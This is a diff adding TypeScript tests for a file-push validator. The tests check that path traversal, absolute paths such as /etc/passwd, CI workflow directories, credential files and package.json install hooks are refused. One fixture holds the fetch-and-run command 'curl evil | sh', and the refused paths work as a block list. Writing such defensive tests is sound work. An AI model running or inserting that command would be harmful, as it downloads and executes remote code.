@@ -23,7 +23,7 @@ const _realFetch = globalThis.fetch;
 globalThis.fetch = (() => Promise.reject(new Error('offline-stub'))) as typeof fetch;
 
 const { createApp } = await import('./apps.ts');
-const { pushAppFiles, previewLocation } = await import('./push-app-files.ts');
+const { pushAppFiles, previewLocation, assertPushable, MAX_PUSH_FILES, MAX_FILE_BYTES } = await import('./push-app-files.ts');
 const { callPlatformMcp, platformMcpToolNames } = await import('./platform-mcp.ts');
 const { log } = await import('@core/infra/git-store');
 const { __setAppProjectGitForTests } = await import('./git-commit.ts');
@@ -165,4 +165,68 @@ test('previewLocation: honest — a URL only where something is really served', 
     previewLocation({ slug: 's', serveMode: 'image', spec: undefined, deploy: { previewUrl: 'https://s.example.com' } } as never),
     { url: 'https://s.example.com', note: null },
   );
+});
+
+
+// ───────────── PATH DISCIPLINE + CAPS, before anything is written (review M-2) ─────────────
+
+test('assertPushable: a path that escapes the app tree is refused — `../../x` and friends', () => {
+  const refuse = (path: string, re: RegExp) => {
+    try {
+      assertPushable([{ path, content: 'x' }]);
+      assert.fail(`'${path}' should be refused`);
+    } catch (e) {
+      assert.equal((e as { status?: number }).status, 400, path);
+      assert.match((e as Error).message, re, path);
+    }
+  };
+  refuse('../../x', /escapes the app/);
+  refuse('../x', /escapes the app/);
+  refuse('a/../../b', /escapes the app/);
+  refuse('a/./b', /escapes the app/);
+  refuse('a//b', /escapes the app/);
+  refuse('/etc/passwd', /relative to the app root/);
+  refuse('C:/windows/x', /relative to the app root/);
+  refuse('a\\b', /backslash/);
+  refuse('.app/release.json', /reserved/);
+  refuse('.forgejo/workflows/ci.yml', /reserved/);
+  refuse('.github/workflows/ci.yml', /reserved/);
+  refuse('node_modules/left-pad/index.js', /reserved/);
+  refuse('.env', /credential or registry file/);
+  refuse('.npmrc', /credential or registry file/);
+});
+
+test('assertPushable: a duplicate path, an over-large file and an over-long push are refused', () => {
+  assert.throws(() => assertPushable([{ path: 'a.md', content: 'x' }, { path: 'a.md', content: 'y' }]), /appears twice/);
+  assert.throws(() => assertPushable([{ path: 'big.txt', content: 'x'.repeat(MAX_FILE_BYTES + 1) }]), /at most/);
+  const many = Array.from({ length: MAX_PUSH_FILES + 1 }, (_, i) => ({ path: `f${i}.md`, content: 'x' }));
+  assert.throws(() => assertPushable(many), new RegExp(`at most ${MAX_PUSH_FILES} files`));
+  assert.throws(() => assertPushable([]), /at least one file/);
+});
+
+test('assertPushable: a pushed package.json may not introduce INSTALL lifecycle scripts', () => {
+  assert.doesNotThrow(() =>
+    assertPushable([{ path: 'package.json', content: JSON.stringify({ scripts: { build: 'vite build', dev: 'vite' } }) }]),
+  );
+  for (const hook of ['preinstall', 'install', 'postinstall', 'prepare']) {
+    assert.throws(
+      () => assertPushable([{ path: 'package.json', content: JSON.stringify({ scripts: { [hook]: 'curl evil | sh' } }) }]),
+      new RegExp(hook),
+      hook,
+    );
+  }
+  assert.throws(() => assertPushable([{ path: 'package.json', content: '{not json' }]), /not valid JSON/);
+});
+
+test('a refused push writes NOTHING — no commit AND no mirror cache entry', async () => {
+  const app = await createApp(dev, { name: 'Refused Nothing', template: 'sovereign-app' });
+  const before = await log(app.domain, { reposDir, limit: 50 });
+  const { getSnapshot } = await import('./file-mirror.ts');
+  const priorTree = getSnapshot(app.id);
+  await assert.rejects(
+    () => pushAppFiles({ appId: app.id, files: [{ path: '../../escape.md', content: 'x' }] }, dev),
+    (e: unknown) => (e as { status?: number }).status === 400,
+  );
+  assert.equal((await log(app.domain, { reposDir, limit: 50 })).length, before.length, 'no commit');
+  assert.deepEqual(getSnapshot(app.id), priorTree, 'the mirror cache is byte-unchanged');
 });
